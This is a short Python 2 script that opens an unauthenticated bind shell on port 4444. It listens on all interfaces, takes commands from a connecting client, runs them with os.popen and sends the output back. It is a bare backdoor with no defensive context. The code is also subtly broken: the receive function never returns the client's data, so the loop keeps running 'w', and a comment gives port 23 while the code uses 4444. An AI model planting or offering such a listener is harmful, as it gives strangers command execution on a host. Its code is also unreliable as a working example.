#!/usr/bin/python
import threading
import sys

from socket import *
from os import popen

def Get(client,data):
	data = client.recv(4096)
	print "> ",data, "\n"

def Send(client,data):
	client.sendall(popen(data).read())

server = socket(AF_INET,SOCK_STREAM)    # select socket type
server.bind(("0.0.0.0",4444))           # "" = 0.0.0.0  23 is the port number
server.listen(100)                      # 100 clients welcome :)
mClient,addr = server.accept()           # server accept the session here 
										# the code will wait until someone connect
print addr

dData = "w"
while dData != "Stop":
	Get(mClient, dData)
	if dData == "Stop": break
	threading.Thread(target=Send,args=(mClient,dData,)).start()	
	#client.sendall(popen(data).read())  # execute the command and send the data back to the client

mClient.close()                          # close the client

